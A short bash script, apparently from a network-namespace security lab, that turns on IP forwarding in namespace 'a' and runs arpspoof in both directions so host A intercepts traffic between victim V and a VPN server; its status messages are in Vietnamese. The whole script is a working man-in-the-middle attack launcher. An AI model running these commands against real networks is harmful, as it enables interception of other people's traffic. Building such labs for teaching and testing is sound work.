#!/usr/bin/env bash
set -euo pipefail
ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
source "$ROOT_DIR/scripts/common.sh"
require_root
require_ns a
require_ns v
require_ns vpn

install -d -m 755 "$PID_DIR"
if [[ -f "$PID_DIR/mitm-v.pid" ]] || [[ -f "$PID_DIR/mitm-vpn.pid" ]]; then
  echo "[ERROR] Helper MITM VPN của add-on có vẻ đang chạy. Dùng stop-mitm-vpn.sh trước."
  exit 1
fi

ip netns exec a sysctl -w net.ipv4.ip_forward=1 >/dev/null

ip netns exec a sysctl -w net.ipv4.ip_forward=1 >/dev/null

ip netns exec a arpspoof -i eth0 -t "$V_IP" "$G_IP" \
    >"$PID_DIR/mitm-v.log" 2>&1 &
echo $! > "$PID_DIR/mitm-v.pid"

ip netns exec a arpspoof -i eth0 -t "$G_IP" "$V_IP" \
    >"$PID_DIR/mitm-vpn.log" 2>&1 &
echo $! > "$PID_DIR/mitm-vpn.pid"

sleep 1
echo "[✓] A đang MITM giữa V và VPN Server trong lab hiện có."
echo "    Không dựng lại hoặc thay đổi namespace V/A/G."
